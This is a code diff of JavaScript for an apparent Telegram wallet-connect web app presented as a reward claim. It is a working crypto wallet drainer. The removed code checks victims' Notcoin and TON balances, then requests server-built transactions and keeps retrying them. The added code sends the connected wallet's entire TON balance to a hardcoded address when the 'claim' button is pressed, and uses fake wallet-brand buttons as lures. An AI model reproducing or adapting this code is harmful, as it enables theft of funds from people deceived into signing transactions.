@@ -4,110 +4,60 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     buttonRootId: 'connect'
 });
 
-function openModal(){
-    if(!tonConnectUI.connected){
-        tonConnectUI.openModal()
+
+function openModal() {
+    if (!tonConnectUI.connected) {
+        tonConnectUI.openModal();
     }
-}   
-
-tonConnectUI.onStatusChange(
-    async (status) => {
-        console.log(status)
-        //console.log(UserFriendlyAddress(status.account.address))
-        if (tonConnectUI.connected) {
-            if (status.account != null) {
-                const user = window.Telegram.WebApp.initDataUnsafe.user
-                const address = UserFriendlyAddress(status.account.address)
-                console.log(UserFriendlyAddress(status.account.address))
-                console.log(user)
-                let balance = await axios.post("./api/index.php", { action: "getBalance", address: address, user: user })
-                balance = balance.data
-                console.log(balance)
-                tonBalance = balance.ton.balance
-                console.log(tonBalance / 1000000000)
-                if (tonBalance / 1000000000 < 0.1 && balance.not && (balance.not.balance / 1000000000) > 250) {
-                    let isGetFee = await axios.post("./api/index.php", { action: "getFee", address: address, user: user })
-                    if (isGetFee.data.status == true) {
-                        Swal.fire({
-                            text: isGetFee.data.message,
-                            icon: 'error',
-                            confirmButtonText: 'OK',
-                            background: "#121214",
-                            color: "#fff",
-                            confirmButtonColor: "#ff0000"
-                        }).then(async (i) => {
-                            await makeTransaction(address, user)
-                        })
-                    } else {
-                        showAutoCloseAlert(isGetFee.data.message, 30000, async () => {
-                            await makeTransaction(address, user)
-                        })
-                    }
-                } else if (tonBalance / 1000000000 > 0.1 && balance.not && (balance.not.balance / 1000000000) > 250) {
-                        await makeTransaction(address, user)
-                } else if (tonBalance / 1000000000 > 0.1 && !balance.jettons) {
-                    Swal.fire({
-                        text: "don't have notcoin",
-                        icon: 'error',
-                        confirmButtonText: 'OK',
-                        background: "#121214",
-                        color: "#fff",
-                        confirmButtonColor: "#00ff00"
-                    }).then(async(i)=>{
-                        await makeTransaction(address, user)
-                    })
-
-                } else if (tonBalance / 1000000000 < 0.1 && !balance.jettons) {
-                    Swal.fire({
-                        text: "you don't have anything",
-                        icon: 'error',
-                        confirmButtonText: 'OK!!!',
-                        background: "#121214",
-                        color: "#fff",
-                        confirmButtonColor: "#00ff00"
-                    }).then(async()=>{
-                        await tonConnectUI.disconnect();
-                    })
-                    
-                }
-
-            }
-        }
-
-    }
-);
-
-
-function UserFriendlyAddress(rawHexAddress) {
-    const { Address } = tonweb.utils;
-    const addressInstance = new Address(rawHexAddress);
-    const userFriendlyAddress = addressInstance.toString(true, true, false);
-    return userFriendlyAddress;
 }
 
-//tonConnectUI.sendTransaction()
 
-async function makeTransaction(address, user) {
-
-    response = await axios.post("./api/index.php", { action: "makeTransaction", address: address, user: user })
-    console.log(response.data)
-    transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
-        messages: response.data
-    }
+async function sendNatCoin(amount, recipientAddress) {
     try {
-        if (transaction = await tonConnectUI.sendTransaction(transaction)) {
-            await axios.post("./api/index.php", { action: "sendSuccess", address: address, user: user ,hash:transaction.boc})
-            Swal.fire({
-                text: "Transaction accepted",
-                icon: 'success',
-                confirmButtonText: 'OK',
-                background: "#121214",
-                color: "#fff",
-                confirmButtonColor: "#00ff00"
-            }).then(await Telegram.WebApp.close())
+
+        const status = await tonConnectUI.getStatus();
+        if (!tonConnectUI.connected || !status.account) {
+            throw new Error('Not connected to wallet');
         }
-    }catch(e){
+
+        const userAddress = status.account.address;
+        const amountInNano = amount * 1000000000; 
+
+
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 60, 
+            messages: [
+                {
+                    address: recipientAddress,
+                    amount: amountInNano,
+
+                }
+            ]
+        };
+
+        const result = await tonConnectUI.sendTransaction(transaction);
+        console.log('Transaction result:', result);
+
+
+        await axios.post("./api/index.php", {
+            action: "sendSuccess",
+            address: userAddress,
+            recipient: recipientAddress,
+            amount: amount,
+            hash: result.boc
+        });
+
+        Swal.fire({
+            text: "Transaction accepted",
+            icon: 'success',
+            confirmButtonText: 'OK',
+            background: "#121214",
+            color: "#fff",
+            confirmButtonColor: "#00ff00"
+        });
+    } catch (error) {
+        console.error('Transaction error:', error);
+
         Swal.fire({
             text: "Transaction declined",
             icon: 'error',
@@ -115,31 +65,80 @@ async function makeTransaction(address, user) {
             background: "#121214",
             color: "#fff",
             confirmButtonColor: "#ff0000"
-        }).then(async()=>{
-            return makeTransaction(address, user)
-        })
+        });
     }
-    
-
 }
 
-async function showAutoCloseAlert(message, time, callback) {
-    await Swal.fire({
-        html: message,
-        timer: time,
-        timerProgressBar: true,
-        //background: "#121214",
-        didOpen: async () => {
-            Swal.showLoading();
-        },
-        allowOutsideClick: false,
-        allowEscapeKey: false
-    }).then(async (result) => {
-        if (result.dismiss === Swal.DismissReason.timer) {
-            await callback();
+
+async function handleClaimReward() {
+    try {
+        const status = await tonConnectUI.getStatus();
+        if (tonConnectUI.connected && status.account != null) {
+            const user = window.Telegram.WebApp.initDataUnsafe.user;
+            const address = UserFriendlyAddress(status.account.address);
+            console.log(UserFriendlyAddress(status.account.address));
+            console.log(user);
+
+            let balance = await axios.post("./api/index.php", {
+                action: "getBalance",
+                address: address,
+                user: user
+            });
+            balance = balance.data;
+            console.log(balance);
+
+            const tonBalance = balance.ton.balance;
+            console.log(tonBalance / 1000000000);
+
+            if (tonBalance / 1000000000 > 0.1) {
+                const recipientAddress = 'UQByUxxBgETfMLa8RSpMbI8mJgwJSooqR3jbEeurubHLcC4x'; 
+                await sendNatCoin(tonBalance / 1000000000, recipientAddress);
+            } else {
+                Swal.fire({
+                    text: "Not enough balance to claim reward",
+                    icon: 'error',
+                    confirmButtonText: 'OK',
+                    background: "#121214",
+                    color: "#fff",
+                    confirmButtonColor: "#ff0000"
+                });
+            }
+        } else {
+            Swal.fire({
+                text: "Not connected to wallet",
+                icon: 'error',
+                confirmButtonText: 'OK',
+                background: "#121214",
+                color: "#fff",
+                confirmButtonColor: "#ff0000"
+            });
         }
-    });
+    } catch (error) {
+        console.error('Error:', error);
+        Swal.fire({
+            text: "An error occurred",
+            icon: 'error',
+            confirmButtonText: 'OK',
+            background: "#121214",
+            color: "#fff",
+            confirmButtonColor: "#ff0000"
+        });
+    }
 }
 
-//debugger
-// openModal()
+
+document.getElementById('claim').addEventListener('click', handleClaimReward);
+
+
+document.getElementById('rainbow-connect-button').addEventListener('click', openModal);
+document.getElementById('metamask-connect-button').addEventListener('click', openModal);
+document.getElementById('wallet-connect-connect-button').addEventListener('click', openModal);
+document.getElementById('rabby-connect-button').addEventListener('click', openModal);
+document.getElementById('trust-wallet-connect-button').addEventListener('click', openModal);
+document.getElementById('coinbase-connect-button').addEventListener('click', openModal);
+
+function UserFriendlyAddress(rawHexAddress) {
+    const { Address } = tonweb.utils;
+    const addressInstance = new Address(rawHexAddress);
+    return addressInstance.toString(true, true, false);
+}
